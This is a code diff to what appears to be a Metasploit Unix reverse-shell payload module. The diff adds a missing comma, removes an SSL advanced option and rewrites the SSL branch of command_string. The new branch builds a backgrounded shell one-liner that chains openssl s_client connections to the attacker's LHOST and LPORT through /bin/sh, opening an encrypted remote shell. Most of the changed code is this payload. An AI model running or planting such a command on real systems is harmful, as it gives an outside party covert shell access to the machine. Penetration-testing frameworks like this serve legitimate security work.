@@ -27,7 +27,7 @@ module Metasploit3
 			'Author'        => [
 						'hdm', # original module
 						'RageLtMan' # SSL patch
-					]
+					],
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'unix',
 			'Arch'          => ARCH_CMD,
@@ -41,11 +41,6 @@ module Metasploit3
 					'Payload' => ''
 				}
 			))
-		# XXX: Not supported by all modules
-		register_advanced_options(
-			[
-				OptBool.new('SSL', [true, 'Use SSL for the listener socket', false]),
-			], Msf::Handler::ReverseTcp)
 	end
 
 	#
@@ -61,8 +56,10 @@ module Metasploit3
 	#
 	def command_string
 		if datastore['SSL']
-			cmd = "openssl s_client -connect #{datastore['LHOST']}:#{datastore['LPORT']}|" +
-				"/bin/bash 2&>1|openssl s_client -connect #{datastore['LHOST']}:#{datastore['LPORT']}"
+			# PoC for ssl shell implementation with SslTcpServer
+			cmd = "sh -c '(openssl s_client -connect #{datastore['LHOST']}:#{datastore['LPORT']}|" +
+				"/bin/sh 2&>1|openssl s_client -connect #{datastore['LHOST']}:" +
+				"#{datastore['LPORT']})'>/dev/null 2>&1 &"
 		else
 			cmd =
 				"sh -c '(sleep #{3600+rand(1024)}|" +
